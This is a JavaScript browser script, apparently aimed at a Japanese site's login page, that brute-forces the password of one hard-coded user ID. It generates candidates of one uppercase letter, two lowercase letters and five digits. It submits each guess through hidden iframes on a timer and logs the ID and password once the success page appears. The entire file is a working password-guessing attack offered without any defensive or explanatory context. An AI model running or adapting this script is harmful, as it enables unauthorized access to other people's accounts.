const sArr = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
const lArr = sArr.map(el => el.toUpperCase());
const h2SolveWord = "感想文の入力";
let NOWUser = 2253874;
let pwNum = 0;
let pwStr = "Aaa";
const pwNumMax = 100000;
const base = [lArr, sArr, sArr];
let inter = 0;

function setInter(TOMS) {
    inter = setInterval(function () {
        let id = pwStr + String(pwNumMax + pwNum).slice(-5);
        check(NOWUser, id);
        pwNum++;
        if (pwNum == pwNumMax) {
            pwNum = 0;
            if (!addPWStr()) {
                clearInterval(inter);
                console.info("not found in All pw");
            };
        }
    }, TOMS);
}

function addPWStr(add) {
    if (add == undefined) add = 1;
    for (let i = 0; i < add; i++) {
        let strId = pwStr.split("").map((el, j) => base[j].indexOf(el));
        pwStr = "";
        strId[strId.length - 1]++;
        for (let j = strId.length - 1; 0 <= j; j--) {
            if (strId[j] == base[j].length) {
                if (j == 0) {
                    return false;
                } else {
                    strId[j] = 0;
                    strId[j - 1]++;
                }
            }
            pwStr = base[j][strId[j]] + pwStr;
        };
    }
    return true;
}

function check(id, pw) {
    return new Promise((res, rej) => {
        document.body.insertAdjacentHTML("beforeend", `<iframe id='ifr${id + pw}'></iframe>`);
        let ifrNode = document.getElementById("ifr" + id + pw);
        ifrNode.onload = function () {
            let ifrDoc = ifrNode.contentDocument;
            ifrDoc.getElementsByName("id")[0].value = id;
            ifrDoc.getElementsByName("pw")[0].value = pw;
            ifrNode.onload = function () {
                let h2 = ifrNode.contentDocument.getElementsByTagName("h2")[0].innerText;
                if (h2 == h2SolveWord) {
                    clearInterval(inter);
                    console.log(`find!! (id: ${id}, pw: ${pw})`);
                    res();
                } else if (h2 == "ユーザー認証") {
                    ifrNode.remove();
                    res();
                } else {
                    console.info("unExpectResolt: " + h2);
                    rej(h2);
                }
            }
            ifrDoc.forms[0].submit();
        }
        ifrNode.src = document.forms[0].action;
    });
}